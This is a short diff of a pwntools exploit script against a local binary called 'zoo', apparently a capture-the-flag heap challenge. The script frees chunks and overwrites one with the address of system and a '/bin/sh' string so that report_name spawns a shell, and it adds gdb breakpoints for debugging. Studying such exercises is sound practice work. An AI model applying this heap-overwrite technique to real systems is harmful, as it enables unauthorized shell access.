@@ -48,6 +48,10 @@ def report_name(idx):
 
 p = process("./zoo")
 
+debug('''b * add_animal
+b * remove_animal
+b * report_name
+''') 
 add_animal("a" * 0x18) #0
 add_animal("/bin/sh;/bin/sh;/bin/sh\x00") #1
 add_animal("b" * 0x18) #2
@@ -59,9 +63,10 @@ remove_animal(2)
 remove_animal(3)
 
 sys_addr = 0x401120
-add_animal(p64(sys_addr) + b"d" * 8 + b'\x20') #0
 
-debug()
+add_animal(p64(sys_addr) + b"d" * 8 + b'/bin/sh\x00') #0
+
+
 report_name(2)
 
 
